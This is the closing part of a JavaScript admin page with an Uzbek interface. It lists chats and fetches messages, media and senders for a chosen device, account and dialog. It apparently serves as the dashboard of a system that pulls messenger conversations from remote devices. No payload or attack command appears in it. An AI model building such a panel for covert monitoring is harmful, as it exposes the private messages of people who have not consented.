list.innerHTML=CHATS.length?CHATS.map(c=>'<div class="ci" id="ci_'+c.id+'" onclick="selectChat(\\''+c.id+'\\')">'+avatar(c.title,46)+'<div class="mid"><div class="t1"><span class="title">'+esc(c.title)+'</span><span class="tm">'+fmtTime(c.date)+'</span></div><div class="t1"><span class="prev">'+esc(c.preview||'')+'</span>'+(c.unread?('<span class="unb">'+c.unread+'</span>'):'')+'</div></div></div>').join(''):'<div class="empty">Chat yo\\'q</div>';
if(CURDLG){const el=document.getElementById('ci_'+CURDLG);if(el)el.classList.add('sel');}}
function chatTitle(id){const c=CHATS.find(x=>String(x.id)===String(id));return c?c.title:id;}
function selectChat(id){CURDLG=id;viewCtx.dialogId=id;document.querySelectorAll('.ci').forEach(e=>e.classList.remove('sel'));const ci=document.getElementById('ci_'+id);if(ci)ci.classList.add('sel');document.body.classList.add('showconv');
const title=chatTitle(id);
document.getElementById('conv').innerHTML='<div id="convhead"><button class="ghost mobback" onclick="closeConv()">&larr;</button>'+avatar(title,40)+'<b>'+esc(title)+'</b><div class="sp"></div><button class="ghost" onclick="refreshMsgs()">Yangilash</button></div><div id="convbody" class="empty">Yuklanmoqda...</div>';
pollMsgs(0,0);}
function closeConv(){document.body.classList.remove('showconv');}
function vidSoon(){alert("Video ko'rish keyingi versiyada qo'shiladi.");}
function refreshMsgs(){const b=document.getElementById('convbody');if(b)b.innerHTML='<div class="empty">Yangilanmoqda...</div>';pollMsgs(0,1);}
function mediaHtml(m){if(!m.media)return '';const md=m.media;
if(md.type==='photo'&&md.thumb)return '<div class="media"><img class="ph" src="data:image/jpeg;base64,'+md.thumb+'" onclick="window.open(this.src)"></div>';
if(md.type==='video')return '<div class="media"><div class="mbtn" onclick="vidSoon()">&#9654; Video'+(md.duration?(' '+md.duration+'s'):'')+'</div></div>';
if(md.type==='file')return '<div class="media"><div class="mbtn">&#128206; '+esc(md.name||'Fayl')+'</div></div>';
if(md.type==='voice'||md.type==='audio')return '<div class="media"><div class="mbtn">&#127925; Ovozli'+(md.duration?(' '+md.duration+'s'):'')+'</div></div>';
return '<div class="media"><div class="mbtn">['+esc(md.type||'media')+']</div></div>';}
async function pollMsgs(tries,refresh){if(mode!=='chats'||!viewCtx.dialogId)return;let d;try{d=await api('/api/messages?device='+encodeURIComponent(viewCtx.devId)+'&account='+encodeURIComponent(viewCtx.accId)+'&dialog='+encodeURIComponent(viewCtx.dialogId)+(refresh?'&refresh=1':''));}catch(e){const b=document.getElementById('convbody');if(b)b.innerHTML='<div class="empty">Xato: '+esc(e.message)+'</div>';return;}
const body=document.getElementById('convbody');if(!body||mode!=='chats')return;
if(d.pending){body.innerHTML='<div class="empty">Qurilmadan so\\'ralmoqda... ('+(tries+1)+')</div>';if(tries<40)setTimeout(()=>pollMsgs(tries+1,0),2500);return;}
const grp=String(viewCtx.dialogId).charAt(0)==='-';
const ms=(d.messages||[]).slice().reverse();
body.className='';
body.innerHTML=ms.length?ms.map(m=>'<div class="msg '+(m.out?'out':'in')+'">'+((!m.out&&grp)?('<div class="snd" style="color:'+avColor(m.sender)+'">'+esc(m.sender)+'</div>'):'')+mediaHtml(m)+esc(m.text)+'<span class="mt">'+fmtTime(m.date)+'</span></div><div class="clr"></div>').join(''):'<div class="empty">Xabar yo\\'q</div>';
body.scrollTop=body.scrollHeight;}
function render(){if(!TOKEN){loginView();return;}document.getElementById('logoutBtn').style.display='';mode='devices';load().catch(e=>{if(e.status===401){TOKEN='';localStorage.removeItem('neyroAdminToken');loginView('Sessiya tugadi, qayta kiring.');}else{main.innerHTML='<div class="empty">Serverga ulanib bo\\'lmadi: '+esc(e.message)+'</div>';}});}
render();setInterval(()=>{if(TOKEN&&mode==='devices')load().catch(()=>{});},5000);
</script></body></html>`;

